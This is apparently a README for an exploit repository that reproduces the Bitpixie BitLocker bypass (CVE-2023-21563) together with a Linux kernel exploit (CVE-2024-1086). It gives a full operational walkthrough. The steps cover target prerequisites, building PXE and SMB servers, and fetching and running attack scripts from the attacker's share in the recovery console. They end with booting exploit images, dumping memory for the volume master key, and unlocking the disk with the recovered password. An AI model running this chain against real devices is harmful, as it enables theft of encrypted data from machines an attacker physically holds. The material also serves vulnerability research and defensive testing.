# Bitpixie

The [bitpixie vulnerability](https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie)
existed since October 2005, was discovered in August 2022 and publicly [disclosed in February 2023 by
Rairii](https://mastodon.social/@Rairii@haqueers.com/109817927808486332) after which it was assigned
[CVE-2023-21563](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21563).

The full attack chain was demonstrated by Thomas in his [38C3 talk](https://events.ccc.de/congress/2024/hub/en/event/windows-bitlocker-screwed-without-a-screwdriver/)
which was followed up by two blog posts:

- [Windows BitLocker -- Screwed without a Screwdriver](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/)
- [On Secure Boot, TPMs, SBAT, and downgrades -- Why Microsoft hasn't fixed BitLocker yet](https://neodyme.io/en/blog/bitlocker_why_no_fix/)

This repository reproduces the original research performed by Thomas based on his talk and blog posts.
The used Linux kernel exploit ([blog](https://pwning.tech/nftables/),
[PoC](https://github.com/Notselwyn/CVE-2024-1086])) for CVE-2024-1086 was 
written by [@notselwyn](https://twitter.com/notselwyn).

Parallel to this work [Andreas Grasser](https://github.com/andigandhi/bitpixie) also 
attempted to reproduce the original research, ending up with a very similar approach.

Beyond simply reproducing the original research this repository also contributes
an alternative WinPE-based exploitation path which might also work if Microsoft's
3rd-party Secure Boot certificate is disabled.

## Prerequisites

BitLocker must be configured without pre-boot authentication also
sometimes referred to as unattended/transparent mode i.e. without a PIN
or a key file.

Booting in PXE mode must be possible. In particular, the UEFI firmware
must have a working TCP/IP stack. If only the network boot option is
disabled, some USB dongles might work around that limitation.

If you have access to the Windows environment, launch an elevated
instance of `msinfo32` the entry *Automatic Device Encryption Support*
should read *Meets prerequisites*.

A TPM 2.0 is needed to support the PCR7 binding
- In Windows open *Device Manager > Security Devices* and check the TPM properties
- Check in the UEFI settings, something like: *Security > Security Chip > Security Chip Selection*.
	
>[!warning]
> Changing the TPM mode will clear the stored keys, therefore:
> 1. Boot Windows, disable BitLocker: `manage-bde -protectors -disable C:`
> 2. Boot into UEFI/BIOS, enable the TPMv2.0 security chip
> 3. Boot Windows, re-enable BitLocker `manage-bde -protectors -enable C:`

Secure Boot needs to be enabled and used for integrity validation.
The command below, must list exactly the PCRs `7, 11`:
```
PS> manage-bde -protectors -get c:
...
      PCR Validation Profile:
        7, 11
        (Uses Secure Boot for integrity validation)
```

> [!warning]
> If the PCR register `4` is included, this attack will not work.

>[!note]
> To make a device intentionally vulnerable a local GPO can be configured:
> 1. Temporarily suspend BitLcoker protection: `manage-bde -protectors -disable C:`
> 2. Create a GPO using `gpedit.msc`
> 	- Open *Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption > Operating System Drives*
> 	- Enable *Configure TPM startup PIN and PCRs* and enter the *PCR values:* `7, 11`
> 3. Apply the GPO: `gpupdate /force`
> 4. Confirm settings: `gpresult /scope coputer /h gpo.html`
> 5. Re-enable BitLocker: `manage-bde -protectors -enable c:`
 
[KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) must not be installed.

Only systems using a bootloader signed with the 2011 Secure Boot certificate are vulnerable. To check this, mount the boot partition and check the signature of `EFI\Microsoft\Boot\bootmgfw.efi`. This can also be performed using [osslsigncode](https://github.com/mtrojnar/osslsigncode).

If your target device has Microsoft's 3rd-party Secure Boot certificate
disabled, only the WinPE-based exploitation strategy might work, otherwise
both should be applicable.

## Environment Setup

A top level Makefile prepares all needed components. Either run it for a
particular exploitation strategy or prepare both scenarios:

```
make
```

This requires a working Docker setup. For the actual exploitation you will
also need:

 - dnsmasq
 - impacket's smbserver.py
 - [Magnet DumpIt for Windows](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/) (for the WinPE-based approach)

### Linux Initramfs Generation

An initramfs containing all needed components based on a stripped down
version of [frood, an Alpine initramfs NAS](https://words.filippo.io/dispatches/frood/)
can be generated with:

```
make linux
```

### WinPE Ramdisk

Similarly, the following command will generate a bootable WinPE environment:

```
make winpe
```

### SMB Server

Start a SMB server from where the attack scripts can be downloaded from
and the resulting, device-specific BCD can be uploaded to. Impacket's
`smbserver.py` works great for that:

```
cd pxe && ./start-smb.sh
```

### PXE Server

Start the PXE server serving the network boot images:

```
cd pxe && ./start-pxe.sh eth0
```

## Attack

### Boot into Recovery Mode

Let Windows boot normally, on the logon screen hold down the *Shift*
key and select the *Restart* option from the power menu.

Windows will reboot into a recovery mode. Select *Troubleshoot > Advanced
Option > Command Prompt*. If desired, select *Change keyboard layout*. When
prompted for BitLocker recovery key, select *Skip this drive*.

You should now be in a command prompt within the recovery environment.

If needed, enable network support:
```
wpeutil initializenetwork
```

> [!note]
> You should see DHCP request served by `dnsmasq`.

Mount the exposed SMB share:
```
net use S: \\10.13.37.100\smb
```

Make sure you are in local temp directory:
```
cd %TEMP%
```

> [!note]
> Either continue with the Linux or WinPE based exploitation.

### Linux-based Exploitation

Copy the attack script to the temporary directory:
```
copy S:\exploit-linux.bat .
```

Execute it to generate a modifed BCD file and upload it to the SMB share
specified with the drive letter:
```
.\exploit-linux.bat S:
```

> [!note]
> The device specific BCD file needs to be served as `Boot\BCD` via PXE.

Exit the command line and chose *Use a device* then select the option
indicating PXE boot (e.g. PCI LAN).

### Boot into Linux Environment

The device should now reboot over PXE, fail to fully load the Windows
boot configuration then fall back to the served Linux environment.

> [!note]
> If you end up on a blank blue screen it might help to press *Escape*
> to show the GRUB boot menu where you can select the Linux system.
> 
> This typically means something did not work as expected.

Login with the `root` user, no password is needed. Follow the instructions
printed in the logon message.  Replace `XYZ` with device file representing
your encrypted BitLocker volume:

```
exploit && ./mount.sh /dev/XYZ && ls mnt
```

### WinPE-based Exploitation

For the WinPE-based exploitation strategy, two BCD files will be needed.

```
copy S:\exploit-winpe1.bat .
```

Upload the generated BCD files to the specified share:

```
.\exploit-winpe1.bat S:
```

Exit the command line and chose *Use a device* then select the option
indicating PXE boot (e.g. PCI LAN).

### Boot into Windows Boot Manager

The device should now reboot and PXE-load the first instance of the Windows
Boot Manager (`bootmgfw.efi`). The provided configuration deliberately points
to a missing second stage boot manager (`bootmgfw-stage2.efi`).

You will therefore encounter an error:

 - File: `\`
 - Status: 0xc00000ba
 - Info: The application or operating system couldn't be loaded because a required
   file is missing or contains errors.

At this point you should switch out the BCD file served by dnsmasq from
`pxe/tftp/Boot/BCD`. One way to do this is to create a symlink such that
`pxe/smb/BCD` no longer points to `BCD_winpe1`, but now refers to the
second stage `BCD_winpe2`.

```
ln -sf BCD_winpe2 pxe/smb/BCD
```

Addtionally, you will have to make sure that the second stage boot manager causing
the original error can now be found.

```
ln -sf bootmgfw.efi pxe/tftp/bootmgfw-stage2.efi
```

Once these changes are in place, press *Enter* to view the *OS Selection*.
Chose the option *softreboot*. This should now fallback to the second stage BCD
which initiates the loading of WinPE from a ramdisk.

> [!note]
> In case of an error, revert the changes, i.e. make sure `BCD_winpe1` is served
> and the second stage boot manager is not found, then retry the procedure.
> ```
> ln -sf BCD_winpe1 pxe/smb/BCD
> rm pxe/tftp/bootmgfw-stage2.efi
> ```

> [!note]
> I automated these steps using a GDB script. However, the resulting setup was somehow
> less reliable than performing the changes manually.

### Boot into WinPE

Connect an external storage device with enough capacity to store a
complete memory dump of your system. We will assume it is mounted at
`c:\`.

Reconnect the SMB share, download the attack script and start the second
part of the exploitation:

```
C:
net use S: \\10.13.37.100\smb
copy S:\exploit-winpe2.bat .
.\exploit-winpe2.bat S:
```

> [!note]
> Alternatively, the necessary tooling can also be copied to the external
> storage. This avoids the need for a network connection and might change
> the internal memory layout.

This will first take a complete memory dump using `DumpIt`. Time will
depend on the amount of memory and the speed of your external drive.

The memory dump is then searched for a volume master key (VMK). If
successful, a `vmk-*.dat` file should now exists in the current directory.

The next step is to determine the byte offset of the encrypted partition
relative to the start of the disk. This information can be queried as
follows:

```
c:\> diskpart
diskpart> list disk
diskpart> select disk 0
diskpart> detail disk
diskpart> list partitions
diskpart> select partition 3
diskpart> detail partition
...
Offset in Bytes: 1234
...
diskpart> assign letter=B

```

> [!note]
> Select the disk and partition indices corresponding to your system.

Once you have have the disk index, partion offset as well as the VMK file,
you can run the following command to hopefully print the BitLocker recovery
password in human readable form:

```
dislocker-metadata.exe -V \\.\PhysicalDrive0 -o 1234 -K vmk.dat
```

> [!warning]
> Capitalization of `PhysicalDrive` matters!

Using the recovery password the encrypted volume can be unlocked:

```
manage-bde -unlock B: -RecoveryPassword 123456-789012-345678-901234-567890-123456
```

> [!warning]
> Unfortunately, the running WinPE instance does not have a working
> BitLocker setup. I built my own, but then the key would no longer
> be in memory. Needs more investigation.
>
> At this point I would suggest to once more boot into the native recovery
> environment where you should be able to unlock the disk.

## Success Stories

Windows 11 devices which were successfully exploited, after manually enabling the TCP stack in the UEFI settings:

- Lenovo ThinkPad T460s 20FAA01100
- Lenovo ThinkPad X280 20KES6C42B
